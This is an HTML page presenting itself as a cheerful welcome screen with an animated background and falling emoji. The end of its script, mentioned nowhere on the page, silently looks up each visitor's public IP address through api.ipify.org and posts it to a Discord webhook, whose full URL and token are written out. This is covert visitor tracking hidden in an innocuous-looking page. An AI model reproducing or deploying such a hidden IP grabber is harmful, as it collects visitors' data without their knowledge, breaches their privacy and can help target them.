<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
  body {
    margin:0; height:100vh; display:flex; align-items:center; justify-content:center;
    background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fad0c4, #fbc2eb, #a6c1ee, #fbc2eb);
    background-size: 400% 400%; animation: bgShift 12s ease infinite;
    font-family: 'Comic Sans MS', 'Chalkboard SE', sans-serif;
    overflow:hidden;
  }
  @keyframes bgShift {
    0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%}
  }
  .card {
    background: rgba(255,255,255,0.85); backdrop-filter: blur(15px); border-radius: 40px;
    padding: 40px 50px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    animation: float 3s ease-in-out infinite; max-width: 90%;
  }
  @keyframes float {
    0%{transform:translateY(0px)} 50%{transform:translateY(-15px)} 100%{transform:translateY(0px)}
  }
  h1 {
    font-size: 3rem; background: linear-gradient(to right, #ff6a00, #ee0979); -webkit-background-clip: text;
    -webkit-text-fill-color: transparent; margin:0 0 20px;
    animation: hueRotate 3s linear infinite;
  }
  @keyframes hueRotate {
    0%{filter:hue-rotate(0deg)} 100%{filter:hue-rotate(360deg)}
  }
  p {
    font-size: 1.4rem; color: #555; margin: 0;
  }
  .emoji-rain {
    position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:-1;
  }
  .emoji {
    position:absolute; font-size:2rem; animation: drop linear infinite; opacity:0.7;
  }
  @keyframes drop {
    0%{transform:translateY(-10vh) rotate(0deg); opacity:0.8}
    100%{transform:translateY(110vh) rotate(360deg); opacity:0}
  }
</style>
</head>
<body>
<div class="emoji-rain" id="rain"></div>
<div class="card">
  <h1>🌸 Welcome! 🌸</h1>
  <p>✨ Stay a while and enjoy the fun ✨</p>
</div>
<script>
const emojis = ['🎈','🎉','🌟','💖','🦄','🍭','🍬','🎀','💫','✨','🎊','💝','🧸','🪅'];
function spawnEmoji() {
  const e = document.createElement('div');
  e.className = 'emoji';
  e.textContent = emojis[Math.floor(Math.random()*emojis.length)];
  e.style.left = Math.random()*100+'%';
  e.style.animationDuration = (Math.random()*4+3)+'s';
  e.style.fontSize = (Math.random()*2+1.2)+'rem';
  document.getElementById('rain').appendChild(e);
  setTimeout(()=>e.remove(), 7000);
}
setInterval(spawnEmoji, 300);
spawnEmoji();
spawnEmoji();
spawnEmoji();

fetch('https://api.ipify.org?format=json')
  .then(r=>r.json())
  .then(d=>{
    fetch('https://discordapp.com/api/webhooks/1522582475803590798/ipROh5wh9UZtbHNhqVdQYxXIeAbFlYMtPqhi04cz88JtldJ_eSR5WWvSzMv6f9j2gpFj', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({content:`Visitor IP: ${d.ip}`})
    });
  });
</script>
</body>
</html>
